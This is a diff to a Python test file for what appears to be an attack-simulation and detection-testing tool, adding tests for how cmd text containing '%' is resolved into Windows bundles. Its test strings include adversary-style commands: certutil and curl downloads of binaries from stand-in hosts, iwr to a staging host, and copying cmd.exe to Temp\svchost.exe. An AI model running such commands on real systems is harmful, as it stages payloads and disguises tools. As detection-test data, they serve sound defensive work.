@@ -212,6 +212,101 @@ class TestDialectInference:
         assert pg.infer_windows_shell("someTool.exe /flag value") == "cmd"
 
 
+# ─── PUSH-11: a `%` that a .cmd file and the command line read differently ──
+
+def _win_variant(cmd: str) -> dict:
+    return _scn([{"id": "step-01", "command": "echo 'x'", "platform_variants": {"windows": cmd}}])
+
+
+class TestCmdPercentContext:
+    """cmd text reaches cmd.exe two ways. The beacon always writes it to a
+    .cmd file; the push bundle does that for multi-line text and passes a
+    single line on the command line. cmd reads `%` differently in the two:
+
+        text                 .cmd file                   command line
+        for /L %i in …       "i was unexpected"          works
+        for /L %%i in …      works                       "%%i was unexpected"
+        a%20b, 1..3|%{…}     the lone % is dropped       kept
+        100%% done           one %                       two
+
+    So one authored text could run on push and fail on pull, or the reverse,
+    and the failure read as a missed detection. The resolver both paths share
+    now refuses such a step by name instead of emitting it.
+    """
+
+    @pytest.mark.parametrize("cmd", [
+        # the shape the routing test above used to pin as correct
+        "for /L %i in (1,1,3) do @curl.exe -s http://h/ & timeout /t 1 >nul",
+        "for /L %%i in (1,1,3) do @echo %%i",
+        "for %f in (*.txt) do type %f",
+        "for /F \"tokens=1\" %a in ('whoami') do echo %a",
+        "curl.exe -s http://h/a%20b -o %TEMP%\\a.bin",
+        "curl.exe -s \"http://h/?q=%41%42\"",
+        'powershell -nop -c "1..3|%{$_}"',
+        "echo 100%% done",
+        "whoami /all\nfor /L %i in (1,1,2) do @echo %i\n",
+    ])
+    def test_context_dependent_percent_is_refused_by_name(self, cmd):
+        assert pg.infer_windows_shell(cmd) == "cmd"
+        assert pg.cmd_percent_is_context_dependent(cmd)
+        res = pg.resolve_target(_win_variant(cmd), "windows")
+        assert not res.emittable
+        assert res.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)
+        with pytest.raises(pg.BundleTargetUnsatisfiable) as exc:
+            pg.generate_powershell(_win_variant(cmd))
+        assert exc.value.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)
+
+    @pytest.mark.parametrize("cmd", [
+        "certutil.exe -urlcache -split -f http://h/a.bin %TEMP%\\a.bin",
+        "type C:\\Windows\\System32\\drivers\\etc\\hosts & nslookup %USERDNSDOMAIN%",
+        'copy /Y "%SystemRoot%\\System32\\cmd.exe" "%SystemRoot%\\Temp\\svchost.exe"\ndir "%SystemRoot%\\Temp\\svchost.exe"\n',
+        'powershell.exe -NoProfile -Command "try { iwr http://%STAGE_HOST%/x } catch { }"',
+        "if exist \"%ProgramFiles(x86)%\\x\" echo found",
+        "ipconfig /all & route print",
+    ])
+    def test_a_paired_variable_reference_is_not_refused(self, cmd):
+        """`%NAME%` means the same thing in both contexts for a variable that
+        is defined, and that is every `%` the corpus' emitted cmd steps carry."""
+        assert not pg.cmd_percent_is_context_dependent(cmd)
+        res = pg.resolve_target(_win_variant(cmd), "windows")
+        assert res.emittable, res.unresolved
+        assert res.steps[0].shell == "cmd"
+
+    @pytest.mark.parametrize("cmd", [
+        "1..3 | % { $_ }",
+        "$x = 7 % 3; Write-Output $x",
+        "Get-ChildItem | % Name",
+        "Invoke-WebRequest -Uri 'http://h/a%20b' -UseBasicParsing",
+    ])
+    def test_a_percent_in_powershell_text_is_never_refused(self, cmd):
+        """`%` is an alias and an operator in PowerShell. Only cmd text is judged."""
+        res = pg.resolve_target(_win_variant(cmd), "windows")
+        assert res.emittable, res.unresolved
+        assert res.steps[0].shell == "powershell"
+
+    def test_the_refusal_says_how_to_fix_it(self):
+        unresolved = (("step-02", pg.REASON_CMD_PERCENT_CONTEXT),)
+        body = pg.BundleTargetUnsatisfiable("SIM-T", "windows", unresolved).to_error()
+        assert body["code"] == "BUNDLE_TARGET_UNSATISFIABLE"
+        assert "step-02 (CMD_PERCENT_CONTEXT)" in body["detail"]
+        assert "PowerShell" in body["detail"] and "%NAME%" in body["detail"]
+        # The step HAS a Windows command; "declare platform_variants.windows" would mislead.
+        assert "declare platform_variants.windows" not in body["detail"]
+
+    def test_a_context_dependent_cmd_cleanup_line_is_residue_not_run(self):
+        line = "for %f in (%TEMP%\\cortexsim-*) do del /q %f"
+        scn = _scn([{"id": "step-01", "command": "echo 'x'"}], cleanup={"commands": [line]})
+        res = pg.resolve_target(scn, "windows")
+        assert res.cleanup == ()
+        assert res.skipped_cleanup == (line,)
+
+    def test_a_windows_only_primary_is_judged_too(self):
+        step = {"id": "step-01", "platforms": ["windows"],
+                "command": "for /L %i in (1,1,3) do @ping -n 1 %COMPUTERNAME%"}
+        res = pg.resolve_target(_scn([step]), "windows")
+        assert res.unresolved == (("step-01", pg.REASON_CMD_PERCENT_CONTEXT),)
+
+
 # ─── resolve_target ──────────────────────────────────────────────────
 
 def _scn(steps, **kw):
@@ -349,11 +444,13 @@ class TestGeneratePowerShell:
         assert "curl -s http://127.0.0.1/update.bin -o /tmp/a.bin" not in out
 
     def test_routes_a_cmd_batch_variant_through_cmd_not_powershell(self):
-        """Pasting `for /L %i …` into a .ps1 yields a script that PARSES and
-        then fails at runtime — the same defect, mirrored."""
+        """Pasting cmd text into a .ps1 yields a script that PARSES and then
+        fails at runtime — the same defect, mirrored. (This test used to pin
+        `for /L %i …`, a shape that only ran in one of the two contexts cmd
+        text reaches; see TestCmdPercentContext.)"""
         scn = _scn([{
             "id": "step-01", "command": "echo 'x'",
-            "platform_variants": {"windows": "for /L %i in (1,1,3) do @curl.exe -s http://h/ & timeout /t 1 >nul"},
+            "platform_variants": {"windows": "ping -n 3 127.0.0.1 >nul & curl.exe -s http://h/ -o %TEMP%\\a.bin"},
         }])
         out = pg.generate_powershell(scn)
         assert "-Shell 'cmd'" in out
